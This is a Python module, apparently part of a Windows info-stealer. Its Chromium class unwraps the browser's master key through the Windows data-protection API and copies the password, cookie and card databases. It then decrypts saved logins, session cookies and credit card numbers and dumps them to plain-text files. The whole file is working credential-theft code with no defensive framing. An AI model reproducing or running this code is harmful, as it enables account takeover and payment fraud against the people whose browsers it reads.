from sqlite3 import connect
from shutil import copyfile
from base64 import b64decode
from json import loads, dump
from os import path, mkdir, remove
from datetime import datetime, timedelta

from Crypto.Cipher import AES
from win32.win32crypt import CryptUnprotectData

from ..utils.config import ChromiumConfig


class Chromium:

    def __init__(self, *args):

        self.config = ChromiumConfig()

        for index, variable in enumerate(self.config.Variables):
            self.__dict__.update({variable: args[index]})

    def __check_paths(self):

        paths = [path.exists(item) for item in [self.passwords_path, self.cookies_path, self.alt_cookies_path, self.cards_path]]

        if any(paths) and any(self.statuses):
            mkdir(rf"{self.storage_path}\{self.storage_folder}\{self.browser_name}")

    def __get_key(self):

        with open(self.state_path, "r", encoding="utf-8") as state:
            return CryptUnprotectData(b64decode(loads(state.read())["os_crypt"]["encrypted_key"])[5:], None, None, None, 0)[1]

    def __decrypt(self, buff, master_key):

        try:
            return AES.new(master_key, AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
        except:
            return "Can't decode"

    def __write_passwords(self, cursor, master_key):

        with open(rf"{self.storage_path}\{self.storage_folder}\{self.browser_name}\Passwords.txt", "a", encoding="utf-8") as passwords:
            for result in cursor.execute(self.config.PasswordsSQL).fetchall():

                password = self.__decrypt(result[2], master_key)

                if any(filter(lambda item: item != "", [result[0], result[1], password])):
                    passwords.write(f"URL: {result[0]}\nUsername: {result[1]}\nPassword: {password}\n\n")

        passwords.close()

    def __write_cookies(self, cursor, master_key):

        results = []

        for result in cursor.execute(self.config.CookiesSQL).fetchall():
            results.append({
                "creation_utc": result[0],
                "top_frame_site_key": result[1],
                "host_key": result[2],
                "name": result[3],
                "value": result[4],
                "encrypted_value": self.__decrypt(result[5], master_key),
                "path": result[6],
                "expires_utc": result[7],
                "is_secure": result[8],
                "is_httponly": result[9],
                "last_access_utc": result[10],
                "has_expires": result[11],
                "is_persistent": result[12],
                "priority": result[13],
                "samesite": result[14],
                "source_scheme": result[15],
                "source_port": result[16],
                "is_same_party": result[17],
            })

        with open(rf"{self.storage_path}\{self.storage_folder}\{self.browser_name}\Cookies.json", "a", encoding="utf-8") as cookies:

            dump(results, cookies)

        cookies.close()

    def __write_cards(self, cursor, master_key):

        with open(rf"{self.storage_path}\{self.storage_folder}\{self.browser_name}\Cards.txt", "a", encoding="utf-8") as cards:
            for result in cursor.execute(self.config.CardsSQL).fetchall():

                number = self.__decrypt(result[3], master_key)

                if any(filter(lambda item: item != "", [result[0], result[1], result[2], number])):
                    cards.write(f"Username: {result[0]}\nNumber: {number}\nExpire Month: {result[1]}\nExpire Year: {result[2]}\n\n")

        cards.close()

    def __check_functions(self):

        functions = (
            {
                "status": self.statuses[0],
                "name": "Passwords",
                "path": self.passwords_path,
                "alt_path": None,
                "method": self.__write_passwords,
                "error": "No passwords found"
            },
            {
                "status": self.statuses[1],
                "name": "Cookies",
                "path": self.cookies_path,
                "alt_path": self.alt_cookies_path,
                "method": self.__write_cookies,
                "error": "No cookies found"
            },
            {
                "status": self.statuses[2],
                "name": "Cards",
                "path": self.cards_path,
                "alt_path": None,
                "method": self.__write_cards,
                "error": "No cards found"
            }
        )

        for item in functions:

            try:

                if item["status"] is True:

                    if path.exists(item["path"]) is True:
                        copyfile(item["path"], rf'{self.storage_path}\{self.browser_name} {item["name"]}.db')

                    elif item["alt_path"] is not None and path.exists(item["alt_path"]):
                        copyfile(item["alt_path"], rf'{self.storage_path}\{self.browser_name} {item["name"]}.db')

                    else:
                        if self.errors is True:
                            print(f'[{self.browser_name.upper()}]: {item["error"]}')
                        return

                    with connect(rf'{self.storage_path}\{self.browser_name} {item["name"]}.db') as connection:
                        connection.text_factory = lambda text: text.decode(errors="ignore")
                        item["method"](connection.cursor(), self.__get_key())
                        connection.cursor().close()

                    connection.close()
                    remove(rf'{self.storage_path}\{self.browser_name} {item["name"]}.db')

            except Exception as e:

                if self.errors is True:
                    print(f"[{self.browser_name.upper()}]: {repr(e)}")

    def run(self):

        try:

            self.__check_paths()
            self.__check_functions()

        except Exception as e:

            if self.errors is True:
                print(f"[{self.browser_name.upper()}]: {repr(e)}")
